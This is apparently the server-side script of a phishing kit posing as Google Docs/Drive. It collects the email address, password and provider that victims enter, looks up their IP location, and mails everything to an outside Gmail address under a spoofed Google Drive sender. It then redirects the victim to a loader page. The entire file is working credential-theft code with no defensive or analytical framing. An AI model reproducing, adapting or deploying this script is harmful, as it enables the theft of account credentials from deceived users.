<?php

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$country = $details->country;
$state = $details->region;
$city = $details->city;
$browser = $_SERVER['HTTP_USER_AGENT'];

$msg = "---------------------------------< Long Money >------------------------------------------\n";
$msg .= "Google D0c's By Lege Moni";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Email : ".$_POST['nemall']."\n";
$msg .= "Password : ".$_POST['Passwd']."\n";
$msg .= "Provider : ".$_POST['Category']."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "Country: '$country' | State: '$state' | City: '$city'\n";
$msg .= "USER-WEB-BROWSER: '$browser'\n";
$msg .= "--------------------------------< Lege Moni >-------------------------------------------\n";

$to = "koboj347@gmail.com";
$subject = "Google Drive 1st $country | $state";
$from = "From: Gdrive<newsupdate@servisgoogledrive.com>";

mail($to,$subject,$msg,$from);

?>
<script type="text/javascript">
	window.location="loader/loader.html"
</script>